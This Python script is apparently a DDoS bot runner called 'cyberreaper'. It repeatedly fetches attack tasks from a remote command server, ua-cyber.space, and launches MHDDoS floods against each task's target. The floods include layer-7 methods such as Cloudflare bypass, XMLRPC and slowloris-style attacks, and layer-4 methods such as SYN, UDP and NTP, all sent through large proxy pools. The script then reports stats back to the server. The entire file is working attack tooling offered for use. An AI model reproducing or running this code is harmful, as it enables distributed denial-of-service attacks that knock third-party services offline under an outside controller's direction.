#!/usr/bin/env python3
import argparse
import json
import os

import psutil
import requests
import subprocess
import sys

from collections import namedtuple
from concurrent.futures import ThreadPoolExecutor, wait
from logging import basicConfig, getLogger, INFO, DEBUG
from socket import gethostname
from time import sleep


basicConfig(format='[%(asctime)s - %(levelname)-5s] [%(name)s]: %(message)s',
            datefmt="%H:%M:%S")

getLogger('proxies').setLevel("CRITICAL")
logger = getLogger("Bot Runner")
logger.setLevel(DEBUG if os.environ.get("DEBUG") else INFO)

host = "https://ua-cyber.space"

url = f"{host}/api/v2/tasks/json/?hostname={gethostname()}&cpu_count={psutil.cpu_count()}"
counters = f"{host}/api/v2/tasks/stats/"

loop_time = 60
RETRY_PERIOD_SEC = 30

l7 = ["GET", "POST", "OVH", "STRESS", "DYN", "DOWNLOADER", "SLOW", "HEAD", "NULL", "COOKIE",
      "PPS", "EVEN", "GSB", "DGB", "AVB", "BOT", "APACHE", "XMLRPC", "CFB", "CFBUAM", "BYPASS", "BOMB"]
l4 = ["TCP", "UDP", "SYN", "CPS", "CONNECTION", "VSE", "TS3",
      "FIVEM", "MEM", "NTP", "MCBOT", "MINECRAFT", "MCPE"]


def dict_to_nt(obj: dict):
    """
    Re-map dict-like object to the namedtuple instance, having eventual
    attributes and values exactly as 'obj' keys and their values.
    :return: instance of generated namedtuple
    """
    return namedtuple('X', obj.keys())(*obj.values())


def as_mhddos_args(config, threads_limit=0):
    if int(config.Duration) > loop_time:
        period = loop_time
    else:
        period = config.Duration
    cfg_threads = config.Threads if threads_limit <= 0 else threads_limit
    if config.UseProxy:
        if config.Proto in l7:
            params = [
                str(config.Proto),
                str(config.Dst),
                str(config.ProxyType),
                str(cfg_threads),
                str(config.ProxyList),
                str(config.RPC),
                str(period)
            ]
        else:
            params = [
                str(config.Proto),
                str(config.Dst),
                str(cfg_threads),
                str(period),
                str(config.ProxyType),
                str(config.ProxyList)
            ]
    else:
        if not config.Proto in l7:
            params = [
                str(config.Proto),
                str(config.Dst),
                str(cfg_threads),
                str(period)
            ]
        else:
            logger.info(
                'No we cant run the LEVEL7 attacks without proxy. Skipping')
            return
    return params


def run_mhddos(start_args: list):
    try:
        mhddos_cmd = f"MHDDoS/start.py {' '.join(mhddos_args)}"
        logger.debug(f"Starting now: {mhddos_cmd}")
        subprocess.run([sys.executable, "MHDDoS/start.py", *start_args])
        logger.debug(f"Completed: {mhddos_cmd}")
        logger.debug(f"POST stats data to {counters} for {start_args[:2]}")
        rs = requests.post(counters, json=start_args)
        if rs.ok:
            logger.debug(f"POST stats for {start_args[:2]}: OK")
        else:
            logger.error(f"Couldn't POST stats to {counters}. Response code: {rs.status_code}, data: {rs.text}")
    except requests.RequestException as rex:
        logger.error(f"POST stats results in error (connection or other timeout issue): {rex}")
    except Exception as ex:
        logger.info(f"OOPS... {start_args[:2]} -> Issue: {ex}")


class TooFewProxiesError(RuntimeError):

    def __init__(self, proxies_count):
        super(TooFewProxiesError, self).__init__(f"Too few working proxies has been loaded: {proxies_count}")


if __name__ == '__main__':

    logger.info('''
  ____      _               ____                         _   _   _   _    
 / ___|   _| |__   ___ _ __/ ___| _ __   __ _  ___ ___  | | | | | | / \   
| |  | | | | '_ \ / _ \ '__\___ \| '_ \ / _` |/ __/ _ \ | | | | | |/ _ \  
| |__| |_| | |_) |  __/ |   ___) | |_) | (_| | (_|  __/ | | | |_| / ___ \ 
 \____\__, |_.__/ \___|_|  |____/| .__/ \__,_|\___\___| | |  \___/_/   \_\ 
      |___/                      |_|                    |_|               
''')
    python_is_39_or_newer = sys.version_info[1] >= 9  # python is 3.9 or earlier
    parser = argparse.ArgumentParser(prog="cyberreaper")
    parser.add_argument("-a", "--max-attacks",
                        action="store",
                        required=False,
                        type=int,
                        default=psutil.cpu_count() // 2 + 1,
                        help="Maximum amount of the attacks executed in parallel (attack pool size).")
    parser.add_argument("-t", "--attack-threads-limit",
                        action="store",
                        required=False,
                        type=int,
                        default=0,
                        help="Limit amount of the threads for every attack. If value >0, it overrules the "
                             "attack's task configuration 'Threads' parameter provided that has higher "
                             "value compared to this option's value.")
    parser.add_argument("-c", "--cpu-limit",
                        action="store",
                        required=False,
                        type=int,
                        default=70,
                        help="Limit the CPU usage by attacks to the specified value.")
    if python_is_39_or_newer:
        # argparse.BooleanOptionalAction exists since python 3.9
        parser.add_argument("--use-proxy",
                            action=argparse.BooleanOptionalAction,
                            required=False,
                            type=bool,
                            default=True,
                            help="Use proxies")
    else:
        # in earlier versions, action="store_true" can be used; however, the setup below
        # doesn't fully replicate the above command-line option --use-proxy/--no-use-proxy,
        # only --no-use-proxy can be set. Still, it will allow to achieve exactly same effect
        # at the end.
        parser.add_argument("-n", "--no-use-proxy",
                            action="store_true",
                            required=False,
                            help="Don't use proxies")
    parser.add_argument("-p", "--min-proxies-needed",
                        action="store",
                        required=False,
                        type=int,
                        default=10000,
                        help="Minimum amount of working (alive) proxies required, defaults to 10000.")

    args = parser.parse_args()
    pool_size = args.max_attacks
    max_threads = args.attack_threads_limit
    cpu_limit = args.cpu_limit
    use_proxy = args.use_proxy if python_is_39_or_newer else not args.no_use_proxy  # based on python version

    logger.info(f"Fetch tasks URL: {url}")

    pool = ThreadPoolExecutor(max_workers=pool_size)
    try:
        # import it here locally, otherwise logging config is screwed
        from proxies import refresh_proxies, update_proxies_file
        _proxies = []
        if use_proxy:
            logger.info("Get fresh proxies. Please wait...")
            _proxies = refresh_proxies()
            if len(_proxies) < args.min_proxies_needed:
                raise TooFewProxiesError(len(_proxies))
        update_proxies_file(_proxies)  # will leave empty file if _proxies=[]
        while True:
            logger.info("Getting fresh tasks from the server!")
            try:
                ftrs = []
                rs = requests.get(url)
                if rs.status_code != 200:
                    logger.error(f"Couldn't get tasks from {url}. Response status={rs.status_code}, "
                                 f"response data={rs.text}")
                    break
                for conf in json.loads(rs.text, object_hook=dict_to_nt):
                    mhddos_args = as_mhddos_args(conf, threads_limit=max_threads)
                    if mhddos_args:
                        cpu_usage = psutil.cpu_percent(4)
                        while cpu_usage > cpu_limit:
                            logger.info(f"The CPU load {cpu_usage} is too high. Thread waiting...")
                            sleep(loop_time)
                            cpu_usage = psutil.cpu_percent(4)
                        while True:
                            pending_count = pool._work_queue.qsize()
                            logger.debug(f"Currently pending attacks: {pending_count}")
                            if pending_count > pool_size:
                                logger.info(f"Number of pending attacks [{pending_count}] "
                                            f"is already enough. Waiting...")
                                sleep(loop_time / 4)
                            else:
                                break
                        logger.info("The system works good! Thanks :P ")
                        logger.info(f"Scheduling next attack for: {conf.Dst}")
                        ftrs.append(pool.submit(run_mhddos, mhddos_args))
                        sleep(loop_time / 10)
                wait(ftrs)
            except Exception as error:
                logger.critical(f"OOPS... We faced an issue: {error}")
                logger.info(f"Retrying in {RETRY_PERIOD_SEC}")
                sleep(RETRY_PERIOD_SEC)
    except TooFewProxiesError as tfpe:
        logger.error(f"Could not load sufficient amount of proxies: {tfpe}")
        logger.error("To continue, you can restart the application with reduced --min-proxies-needed option value.")
    except KeyboardInterrupt:
        logger.info("Shutting down... Ctrl + C")
    except Exception as error:
        logger.critical(f"OOPS... We faced an issue: {error}")
        logger.info("Please restart the tool! Thanks")
    finally:
        pool.shutdown(wait=False, cancel_futures=True)
